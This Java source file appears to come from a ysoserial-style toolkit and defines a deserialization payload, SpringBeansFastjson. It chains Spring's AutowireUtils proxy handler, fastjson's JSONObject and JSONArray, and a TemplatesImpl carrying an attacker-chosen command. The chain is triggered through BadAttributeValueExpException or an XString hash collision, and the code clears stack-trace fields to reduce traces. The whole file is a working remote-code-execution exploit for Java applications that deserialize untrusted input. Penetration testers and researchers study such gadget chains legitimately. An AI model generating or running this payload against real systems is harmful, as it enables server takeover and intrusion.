package ysoserial.payloads;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import javassist.CtClass;
import org.springframework.beans.factory.ObjectFactory;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavassistHelper;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.openmbean.*;
import javax.xml.transform.Templates;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.HashMap;

@Dependencies({"com.alibaba:fastjson:1.x","org.springframework:springframework.beans:Spring-beans<5.3||>=5.3"})
@Authors({Authors.Unam4})
public class SpringBeansFastjson implements ObjectPayload<Object> {
    private  Object inv;

    /**
     * Will call all getter methods on payload that are defined in the given interfaces
     */

    public Object getObject(final String command) throws Exception {

        Boolean xs = false;
        String obj = "";
        String serialVersionUID = "-8835275493235412717";
        if (command.contains("_")) {
            String[] s = command.split("_");
            obj = s[0];
            if (s[1].equals("xString")) {
                xs =true;
            }
            if (s.length==3 && s[2] != null){
//                @Choice(label = "低版本Spring-beans <5.3 -8835275493235412717", value = "-8835275493235412717"),
//                @Choice(label = "高版本Spring-beans >=5.3 -1515767093960859525", value = "-1515767093960859525"),
                serialVersionUID ="-1515767093960859525";
            }
        }else {
            obj = command;
        }

        final Object template = Gadgets.createTemplatesImpl(obj);
        // 新建一个Classloader来加载不同serid的AutowireUtils$ObjectFactoryDelegatingInvocationHandler
        if (serialVersionUID == "-1515767093960859525") {
            JavassistHelper javassistHelper = new JavassistHelper("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
            javassistHelper.setSerialVersionUID("-1515767093960859525");
            CtClass ObjectFactoryInv = javassistHelper.getCtClass();
            Class<?> aClass = ObjectFactoryInv.toClass(new URLClassLoader(new URL[0]), null);
            inv = Reflections.createWithoutConstructor(aClass);
            ObjectFactoryInv.defrost();
        }else {
            inv = Reflections.createWithoutConstructor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        }

        HashMap<String, Object> hashMap = new HashMap<>();
        hashMap.put("object", template);

        com.alibaba.fastjson.JSONObject jsonObject = new JSONObject(hashMap);

        Object o2 = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{ObjectFactory.class},jsonObject);
//        Object inv = Reflections.createWithoutConstructor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Reflections.setFieldValue(inv, "objectFactory", o2);

        Object o = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[]{Templates.class},(InvocationHandler)inv);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);
        if (xs){
            Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
            Object xString = Reflections.createWithoutConstructor(aClass1);
            Reflections.setFieldValue(xString,"m_obj",new char[]{});
            HashMap hashMap1 = new HashMap();
            HashMap hashMap2 = new HashMap();
            hashMap1.put("zZ",xString);
            hashMap1.put("yy",jsonArray);
            hashMap2.put("yy",xString);
            hashMap2.put("zZ",jsonArray);
            HashMap map = makeMap(hashMap1, hashMap2);
            ArrayList<Object> arrayList = new ArrayList<>();
            arrayList.add(template);  //加入期望类
            arrayList.add(o);
            arrayList.add(map);
            return arrayList;
        }


        javax.management.BadAttributeValueExpException badAttributeValueExpException = new javax.management.BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
        // 防止记录运行时的调用栈信息
        Reflections.setFieldValue(badAttributeValueExpException, "stackTrace", new StackTraceElement[0]);
        Reflections.setFieldValue(badAttributeValueExpException, "suppressedExceptions", null);
        Reflections.setFieldValue(badAttributeValueExpException, "cause", null);
        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(template);
        arrayList.add(o);
        arrayList.add(badAttributeValueExpException);
        return arrayList;
    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SpringBeansFastjson.class, args);
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

}
